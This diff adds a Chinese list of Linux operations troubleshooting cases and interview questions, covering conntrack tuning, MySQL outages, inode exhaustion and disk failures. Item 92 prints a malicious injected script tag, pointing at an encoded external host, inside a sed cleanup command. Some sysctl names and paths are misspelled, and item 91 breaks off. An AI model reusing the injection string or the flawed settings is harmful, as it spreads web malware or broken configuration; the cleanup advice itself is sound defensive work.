@@ -1,0 +1,108 @@
+79.CDN或IDC带宽突然增加很高分析解决案例
+
+80./var/log/messages 出现kernel:nf_conntrack:table full,dropping packet,什么问题，如何解决
+解答：
+上述结果会让业务访问很慢
+net.nf_conntrack_max=25000000
+net.netfilter.nf_conntrack_max=25000000
+net.netfilter.nf_conntrack_tcp_timeout_established=180
+net.netfilter.nf_conntrack_tcp_timeout_time_wait = 120
+net.netfilter.nf_conntrack_tcp_timeout_closw_wait = 60
+net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 120
+
+81.IDC机房带宽突然暴涨问题（几个故障案例）CDN,木马
+http://oldboy.blog.51cto.com/2561410/909696
+
+82.一次网站迁移故障及分析
+http://lxshopping.blog.51cto.com/4542643/1574929
+
+83.一主多从，主从库分别宕机的解决案例
+
+84.增量恢复企业案例，误操作导致数据破坏案例
+
+85.某电商网站数据库宕机故障解决案例
+http://oldboy.blog.51cto.com/2561410/143116161
+
+86.公司里数据库负载高，因为网站前端搜索框对外提供搜索导致案例
+a.数据库负载高，有慢查询，做联合索引案例
+b.数据库负载高，有慢查询，LIKE'%杜冷丁%'，没法做索引，案例
+
+87.负载高优化SQL语句，创建联合索引案例
+
+88.mysql sleep线程过多的问题案例
+
+89.数据库强制关闭导致故障排除实战案例（增量恢复）
+野蛮粗鲁杀死数据库导致故障企业案例
+http://oldboy.blog.51cto.com/2561410/1431161
+http://oldboy.blog.51cto.com/2561410/1431172
+http://www.cnblogs.com/peida/archive/2012/12/20/2825837.html
+
+90.网站访问慢的案例
+linux java/http/php 中某一个进程占用cpu很高
+解决案例：
+top -p 32311
+strace -p 32311
+strace -f CMD
+
+91.我写了一个重启resin的脚本，由于业务原因，需要定时在某一个时间重启下resin服务器
+于是就在crontab里配置了如下内容
+50 17 * * 1-5 root /usr/local/bin/resin_restart.sh
+其中，resin_restart.sh内容如下：
+#!/bin/sh
+/usr/local/bin/xxresin_stop.sh
+/usr/local/bin/xxresin_start.sh
+有问题的时刻到来了，服务器虽然定时起来了，但是却报了如下错误：
+
+92.企业的网站遭受木马攻击了，导致网站目录下所有文件都被篡改了
+find /root/oldboy -type f|xargs sed -i 's#<script language=javascript src=http://%4%66E%78%6F%72%67%2E%70%6F/x.js?goole_ad=93x28_ad></script>##g'
+不要忘了亡羊补牢，寻找问题来源，补好漏洞，网站目录权限降低，上传附件的入口做详细过滤
+
+93.fstab修改错误导致系统无法启动故障修复案例
+维护模式或救援模式
+mount -o rw,remount /
+然后修改/etc/fstab
+
+http://blog.sina.com.cn/s/blog_4a2fadfn010131jf.html
+
+95.linux TIME_WAIT状态数过多如何处理
+
+96.18期说过的
+/var/spool/clientmquene文件过多导致inode被消耗尽，no space left on device
+这么多文件哪里来的
+
+解决方案
+1.将crontab里面的命令后面加上 > /dev/null 2>&1
+2.知识点：
+       2>:重定向错误
+       2>&1:把错误重定向输出到要送到的地方，即把上述命令的执行结果重定向到/dev/null,即抛弃，同时，把产生的错误也抛弃
+3.清除/var/spool/clientmquene/目录下的文件
+http://blog.sina.com.cn/s/blog_506ed9e6010106kj.html
+http://blog.sina.com.cn/s/blog_4dd475390100c47m.html
+
+97.文件删除生产场景案例解决实战
+web服务器磁盘满故障深入解析
+http://oldboy.blog.51cto.com/2561410/612351
+磁盘满案例
+http://blogread.cn/it/article/6565?f=wb
+
+98.企业面试题
+一个100m（block的总大小，个数和单个block大小有关）的磁盘分区，分别写入0.5k的文件，
+及希尔1m的文件，分别可以写多少个，为什么
+
+99.如果向磁盘写入数据提示如下错误：No space left on device ,通过df -h 查看磁盘空间
+发现没满，请问可能的原因是什么
+解答：可能是inode数量被消耗尽了
+企业工作中邮件临时队列/var/spool/clientmquene这里很容易被大量小文件占满
+手动清理
+#find /var/spool/clientmquene/ -type f|xargs rm -f #适合centos5的sendmail服务
+#find /var/spool/postfix/maildrop/ -type f |xargs rm -f #适合centos6的postfix服务
+定时清理的方法：将上述命令写成脚本，然后做成定时任务，每天晚上0点执行一次
+
+
+
+100.用SATA磁盘来做在线高并发服务的数据存储或数据库业务
+SATA做数据库的存储盘，结果导致数据库连续宕机一个月
+当时：4块SATA RAID5
+
+解决：新买4台服务器硬RAID卡，4块SAS 300G 15K RAID 10或0.RAID 0 1 5 10
+把磁盘从SATA(RAID5)换成SAS(RAID10)
